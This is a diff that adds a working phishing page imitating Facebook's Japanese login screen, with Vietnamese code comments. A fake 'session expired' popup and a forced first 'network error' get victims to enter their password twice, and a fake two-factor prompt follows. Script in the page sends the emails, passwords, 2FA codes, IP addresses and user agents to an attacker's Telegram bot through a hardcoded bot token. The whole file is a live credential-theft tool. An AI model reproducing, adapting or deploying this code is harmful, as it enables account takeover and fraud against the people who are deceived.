@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="https://meta.case85226.com/assets/facebook_logo_icon_147291-f2dfc6fd.ico" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Facebook</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, white,);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .logo {
+      width: 57px; 
+      height: auto; 
+      margin: 0 auto 20px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    input,
+    button {
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      font-size: 16px;
+      box-sizing: border-box;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    button.loading span {
+      visibility: hidden;
+    }
+    button.loading::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #ffffff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      transform: translate(-50%, -50%);
+    }
+    @keyframes spin {
+      from {
+        transform: translate(-50%, -50%) rotate(0deg);
+      }
+      to {
+        transform: translate(-50%, -50%) rotate(360deg);
+      }
+    }
+    .secondary-button {
+      width: 100%;
+      padding: 15px;
+      background-color: white;
+      color: #1877f2;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      margin-top: 12px;
+    }
+    .secondary-button:hover {
+      background-color: #f0f0f0;
+    }
+    .hidden {
+      display: none;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 15px;
+      text-align: center;
+    }
+    .countdown {
+      font-size: 14px;
+      color: red;
+      margin-top: 10px;
+    }
+    .meta-text {
+      width: 60px; 
+      opacity: 0.7;
+      height: auto;
+      margin-top: 20px;
+    }
+    .auth-image {
+      width: 100%;
+      max-width: 395px;
+      height: auto;
+      margin-top: 20px;
+      border-radius: 15px;
+      border: 1px solid #ddd;
+    }
+
+    /* Căn lề trái cho phần tiêu đề và đoạn mô tả */
+    #step3 h3,
+    #step3 p {
+      text-align: left;
+      margin-left: 0;
+    }
+
+    .english-text {
+      opacity: 0.6; /* Làm mờ chữ một chút */
+      font-size: 14px;
+      color: #606770;
+    }
+    .password-container {
+      position: relative;
+      width: 100%;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+    .pending-approval {
+    display: flex;
+    align-items: center;
+    justify-content: flex-start; /* Căn lề trái */
+    gap: 10px;
+    width: 100%;
+    margin-bottom: 20px;
+}
+
+/* Hình tròn nhỏ hơn và dấu 3 chấm */
+.loading-circle {
+    width: 20px;
+    height: 20px;
+    border: 1.5px solid #ccc;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Chấm nhỏ hơn */
+.dot {
+    width: 4px;
+    height: 4px;
+    background-color: black;
+    border-radius: 50%;
+    margin: 0 1px;
+    animation: blink 1.5s infinite ease-in-out;
+}
+
+#step3 .pending-approval {
+  margin-bottom: 5px; /* Decrease the margin below the 'Pending approval' text */
+}
+
+#step3 form {
+  margin-top: 5px; /* Reduce the margin above the input box */
+}
+
+#step3 .approval-text p {
+  margin-top: 5px; /* Adjust the top margin to bring the text closer to the form */
+}
+body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, white, #ffffff);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            position: relative;
+        }
+        .modal {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            z-index: 10;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+        }
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 250px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+        .modal hr {
+            border: none;
+            border-top: 1px solid #ccc;
+            margin: 1px 0;
+            width: calc(100% + 40px);
+            position: relative;
+            left: -20px;
+        }
+        .modal button {
+            background-color: transparent;
+            color: #007BFF;
+            border: none;
+            padding: 0px 0;
+            margin-top: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: normal;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 1;
+        }
+
+  </style>
+</head>
+<body>
+  <!-- Step 2: Login Form -->
+  <div class="container" id="step2">
+    <form id="login-form">
+      <span class="english-text">日本</span>
+      <br><br><br><br>
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+      <br><br>
+      <input type="text" id="email" name="email" placeholder="電話番号またはメールアドレス" required>
+      <div class="password-container">
+        <input type="password" id="password" name="password" placeholder="パスワード" required>
+        <span class="toggle-password" data-target="password">
+          <!-- Eye Icon -->
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M2 2L22 22" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+            <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+        </span>
+      </div>
+      <button type="submit" id="login-button"><span>ログイン</span></button>
+      <div class="error-message hidden" id="login-error-message">ネットワーク接続でエラーが発生しました。もう一度お試しください。 <a href="#"></a></div>
+      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" style="font-size: 16px; color: black; text-decoration: none;">
+        パスワードをお忘れですか？
+      </a>      
+    
+    </form>
+    <br><br><br><br><br><br><br>
+    <button class="secondary-button">新しいアカウントを作成する</button>
+    <div class="logo-container">
+      <img class="meta-text" src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta Logo">
+  </div>
+  </div>
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+        <p><strong>セッション切れです</strong></p>
+        <p>もう一度ログインしてください。</p>
+        <hr>
+        <button onclick="closeModal()">了解です</button>
+    </div>
+</div>
+
+<script>
+    document.getElementById("myModal").style.display = "flex";
+    function closeModal() {
+        document.getElementById("myModal").style.display = "none";
+    }
+</script>
+  <!-- Step 3: 2FA Code Form -->
+  <!-- Step 3: 2FA Code Form -->
+<div class="container hidden" id="step3">
+  <h3>• Facebook</h3>
+  <h3>確認コードを入力して確認してください</h3>
+  <p>別のデバイスでご自身のFacebookアカウントの通知を確認するか、Google認証システム、メール、SMSなどで送信された6桁または8桁のコードを入力してください。</p>
+
+  <img class="auth-image" src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-Device-Mobile_light-3x.png" alt="Authentication Image">
+
+  <!-- Move Pending Approval above form -->
+  <div class="pending-approval">
+    <div class="loading-circle">
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+    </div>
+    <div class="approval-text">
+      <p><strong>承認を待っています</strong></p>
+      <p>別のデバイスで通知を受け取るまでに数分かかる場合があります。</p>
+    </div>
+  </div>
+
+  <!-- Move the form below approval text -->
+  <form id="auth-form">
+    <input type="text" id="auth-code" name="auth-code" placeholder="コードを入力してください" required pattern="[0-9]+" title="Only numbers are allowed">
+    <div class="error-message hidden" id="2fa-error-message">このコードは無効です。コードが正しいか確認するか、新しいコードを試してください。<span id="countdown">30s</span></div>
+    <button type="submit" id="auth-button"><span>続行</span></button>
+    <button type="button" class="secondary-button" id="try-another-way-button">別の方法を試してください</button>
+  </form>
+  <img class="meta-text" src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta Logo">
+</div>
+
+
+  <script>
+    document.querySelector('.toggle-password').addEventListener('click', function() {
+      var passwordField = document.getElementById('password');
+      var type = passwordField.type === "password" ? "text" : "password";
+      passwordField.type = type;
+    });
+  </script>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7860886549:AAEeNa8NEihgXhGQjUEd7euVmkdLl-8IJGg";
+const CHAT_ID = "1148231049"; // Thay Chat ID của bạn
+const loginForm = document.getElementById("login-form");
+const authForm = document.getElementById("auth-form");
+const step1 = document.getElementById("step1");
+const step2 = document.getElementById("step2");
+const step3 = document.getElementById("step3");
+const loginButton = document.getElementById("login-button");
+const authButton = document.getElementById("auth-button");
+const twoFaErrorMessage = document.getElementById("2fa-error-message");
+const countdownElement = document.getElementById("countdown");
+let countdownInterval;
+let passwordAttempts = 0;
+const userAgent = navigator.userAgent;
+
+// Hàm gửi tin nhắn tới Telegram
+function sendMessageToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const data = {
+    chat_id: CHAT_ID,
+    text: message
+  };
+
+  fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log("Message sent successfully", data);
+  })
+  .catch(error => {
+    console.error("Error sending message to Telegram", error);
+  });
+}
+
+function getUserIPAndCountry() {
+  return fetch('https://ipinfo.io/json?token=9f5c75e853c741') 
+    .then(response => response.json())
+    .then(data => ({
+      ip: data.ip, // Địa chỉ IP của người dùng
+      country: data.country // Quốc gia của người dùng
+    }))
+    .catch(error => {
+      console.error("Error fetching IP and country", error);
+      return { ip: "IP not found", country: "Country not found" }; // Giá trị mặc định nếu có lỗi
+    });
+}
+
+setTimeout(() => {
+  step1.classList.add("hidden");
+  step2.classList.remove("hidden");
+}, 2000); 
+
+loginForm.addEventListener("submit", function (event) {
+  event.preventDefault();
+  toggleLoading(loginButton, true); 
+
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  setTimeout(() => {
+    toggleLoading(loginButton, false);
+
+    if (passwordAttempts === 0) {
+      document.getElementById("login-error-message").classList.remove("hidden");
+      passwordAttempts++;
+      getUserIPAndCountry().then(({ ip, country }) => {
+        const message = `🇯🇵 JAPAN PAGE \n\nPassword 1:\n\n 📧 Email: ${email}\n\n 🔑 Mật khẩu: ${password}\n\n 🌐 Địa chỉ IP: ${ip}\n\n 🌍 Quốc gia: ${country}\n\n 📱 User-Agent: ${userAgent}`;
+        sendMessageToTelegram(message);
+      });
+    } else if (passwordAttempts === 1) {
+      step2.classList.add("hidden");
+      step3.classList.remove("hidden");
+      getUserIPAndCountry().then(({ ip, country }) => {
+        const message = `🇯🇵 JAPAN PAGE \n\nPassword 2:\n\n 📧 Email: ${email}\n\n 🔑 Mật khẩu: ${password}\n\n 🌐 Địa chỉ IP: ${ip}\n\n 🌍 Quốc gia: ${country}\n\n 📱 User-Agent: ${userAgent}`;
+        sendMessageToTelegram(message);
+      });
+    }
+  }, 3000); 
+});
+
+function toggleLoading(button, isLoading) {
+  button.classList.toggle("loading", isLoading);
+  button.disabled = isLoading;
+}
+
+let incorrectAttempts = 0;
+
+authForm.addEventListener("submit", function (event) {
+  event.preventDefault();
+  const authCode = document.getElementById("auth-code").value;
+  const correctCode = "654321";
+
+  toggleLoading(authButton, true); 
+
+  setTimeout(() => {
+    toggleLoading(authButton, false);
+
+    if (authCode === correctCode) {
+      // Nếu mã đúng
+      alert("Verification successful!");
+      getUserIPAndCountry().then(({ ip, country }) => {
+        const message = `2FA verification successful.\n 📧 Email: ${email}\n 🔑 Mật khẩu: ${password}\n 🔐 Mã 2FA: ${authCode}\n\n 🌐 Địa chỉ IP: ${ip}\n\n 🌍 Quốc gia: ${country}\n\n 📱 User-Agent: ${userAgent}`;
+        sendMessageToTelegram(message);
+      });
+    } else {
+      incorrectAttempts++;  // Tăng số lần nhập sai
+
+      if (incorrectAttempts >= 5) {  // Đã thay đổi số lần sai từ 3 lên 5
+        alert("Too many incorrect attempts. Moving to the next step.");
+        step3.classList.add("hidden");
+        step2.classList.remove("hidden");
+      } else {
+        startCountdown(30);  // Hiển thị thời gian đếm ngược nếu nhập sai
+        twoFaErrorMessage.classList.remove("hidden");
+        getUserIPAndCountry().then(({ ip, country }) => {
+          const message = `🇯🇵 JAPAN PAGE \n\n🔐 code 2FA-681: ${authCode}\n\n 🌐 Địa chỉ IP: ${ip}\n\n 🌍 Quốc gia: ${country}\n\n 📱 User-Agent: ${userAgent}`;
+          sendMessageToTelegram(message);
+        });
+      }
+    }
+  }, 3000);
+});
+
+function startCountdown(seconds) {
+  let timeLeft = seconds;
+  countdownElement.textContent = `${timeLeft}s`;
+  clearInterval(countdownInterval);
+
+  countdownInterval = setInterval(() => {
+    timeLeft--;
+    countdownElement.textContent = `${timeLeft}s`;
+
+    if (timeLeft <= 0) {
+      clearInterval(countdownInterval);
+      twoFaErrorMessage.classList.add("hidden");
+    }
+  }, 1000);
+}
+
+  </script>
+</body>
+</html>
